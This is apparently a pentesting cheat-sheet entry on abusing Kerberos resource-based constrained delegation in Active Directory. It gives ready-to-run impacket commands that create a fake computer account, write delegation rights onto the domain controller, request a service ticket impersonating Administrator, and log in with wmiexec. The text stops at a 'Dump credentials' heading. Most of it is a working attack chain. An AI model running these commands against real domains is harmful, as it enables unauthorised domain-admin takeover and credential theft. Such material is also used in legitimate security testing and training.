## Exploit

Reference: [https://github.com/tothi/rbcd-attack#abusing-kerberos-resource-based-constrained-delegation](https://github.com/tothi/rbcd-attack#abusing-kerberos-resource-based-constrained-delegation)

### 0. Prerequisites

To achieve this attack successfully, we need the following conditions:

- A domain account who has permission to write the computer (`msDS-AllowedToActOnBehalfOfOtherIdentity` property of the domain object).
- A domain account who has permission to create a new computer.
- LDAP (389) and SAMR (445) or LDAPS (636) access to the DC.
- Kerberos (88) access to the DC.

### 1. Create Fake Computer

```bash
impacket-addcomputer -computer-name 'FAKECOMPUTER$' -computer-pass 'password123' -dc-ip 10.0.0.1 'example.local/username:password'
```

### 2. Modify Delegation Rights

We can use [rbcd.py](https://github.com/tothi/rbcd-attack#abusing-kerberos-resource-based-constrained-delegation) for abusing `msDS-AllowedToActOnBehalfOfOtherIdentity` property of the target.

```bash
impacket-rbcd -delegate-from 'FAKECOMPUTER$' -delegate-to 'DC$' -dc-ip 10.0.0.1 -action 'write' 'example.local/username:password'
```

### 3. Get the Impersonated Service Ticket

Impersonated service tickets may allow high-level access to services on the target like CIFS (Common Internet File System), HTTPs, etc.

```bash
impacket-getST -spn 'cifs/dc.example.local' -impersonate Administrator -dc-ip 10.0.0.1 'example.local/FAKECOMPUTER$:password123'
# or
impacket-getST -spn 'ldap/dc.example.local' -impersonate Administrator -dc-ip 10.0.0.1 'example.local/FAKECOMPUTER$:password123'
```

### 4. Use the Service Ticket

After getting the service ticket, we can use it for further pentesting.  
Before doing that, we need to add the environment variable as below:

```bash
export KRB5CCNAME=`pwd`/admin.ccache

# Check by listing tickets.
# If the klist command not found, install it by `apt install krb5-user`
klist
```

- Login to Services with Kerberos Auth
    
    ```bash
    # -k: Use Kerberos Auth
    # -no-pass: No password
    impacket-wmiexec example.local/Administrator@example.local -k -no-pass
    ```

- Dump credentials
